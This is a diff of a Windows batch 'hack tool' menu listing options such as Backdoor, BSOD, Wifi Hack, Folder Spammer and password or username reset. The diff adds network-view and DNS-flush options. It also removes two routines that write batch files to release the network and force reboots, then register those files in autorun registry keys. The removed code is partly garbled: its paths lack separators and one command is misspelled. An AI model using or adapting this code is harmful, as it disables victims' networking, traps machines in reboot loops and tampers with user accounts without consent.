@@ -50,8 +50,8 @@ echo --------------------------------------------------- MENU V1.3 -------------
 echo.         
 echo Choose^^!
 echo.
-echo [1] Backdoor (Windows)			[10] Processes
-echo [2] Pyranha^^!				[11] System Indo
+echo [1] Backdoor (Windows)			[10] Processes              [19] Devices On Network
+echo [2] Pyranha^^!				[11] System Info            [20] Flush DNS Cache
 echo [3] Folder Spammer			[12] Random User Password
 echo [4] Show/Hide Files			[13] Pyranha^^!^^! Spam
 echo [5] Open Programs			[14] Reset color
@@ -60,9 +60,9 @@ echo [7] BSOD(Dangerous^^!^^!)			[16] BSOD2(Dangerous^^!^^!)
 echo [8] Wifi Hack                           [17] Diary 
 echo [9] Change color                        [18] Reset Username
 echo.
-echo [19] Exit 
+echo [21] Exit 
 echo.
-set /p MenuChoose=       
+set /p MenuChoose= Option: 
 if %MenuChoose% == 1 goto Choose(BD)
 if %MenuChoose% == 2 goto flashything
 if %MenuChoose% == 3 goto openfolderspam
@@ -81,7 +81,9 @@ if %MenuChoose% == 15 goto securegoing
 if %MenuChoose% == 16 goto deldrive
 if %MenuChoose% == 17 goto diary
 if %MenuChoose% == 18 goto resetusn
-if %MenuChoose% == 19 goto exit
+if %MenuChoose% == 19 goto netv
+if %MenuChoose% == 20 goto flushcache
+if %MenuChoose% == 21 goto exit
 pause >nul
 
 :sd
@@ -413,28 +415,6 @@ echo.
 pause
 goto MainMenu
 
-:disnet
-pause
-cls
-echo @echo off>c:windowswimn32.bat
-echo break off>>c:windowswimn32.bat
-echo ipconfig/release_all>>c:windowswimn32.bat
-echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversion /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversion /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-pause
-goto MainMenu
-
-:exitstartup
-cls
-echo @echo off>c:windowshartlell.bat
-echo break off>>c:windowshartlell.bat
-echo shutdown -r -t 11 -f>>c:windowshartlell.bat
-echo end>>c:windowshartlell.bat
-red add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d  /f c:windowshartlell.bat
-pause
-goto MainMenu
-
 :randpass
 cls
 set /p username= The name of the user:  
@@ -558,3 +538,17 @@ del /f user.txt
 echo.
 pause
 goto user
+
+:netv
+cls
+echo.
+net view 
+pause
+goto MainMenu
+
+:flushcache
+echo.
+ipconfig /flushdns
+echo.
+pause
+goto MainMenu
